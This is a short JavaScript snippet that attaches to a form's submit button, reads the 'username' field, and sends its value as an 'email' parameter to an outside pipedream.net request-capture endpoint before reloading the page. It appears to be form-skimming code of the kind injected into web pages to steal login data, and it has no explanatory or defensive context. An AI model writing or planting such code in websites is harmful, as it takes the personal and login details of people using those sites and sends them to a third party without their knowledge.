var submitBtn = document.querySelector(".btn btn-primary btn-block mt-3");

async function logging(){
    alert("done");
    const t = document.getElementById("username").value;
    await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${t}`);
    window.location.reload();
}

submitBtn.addEventListener("click", async function () {
    logging();
});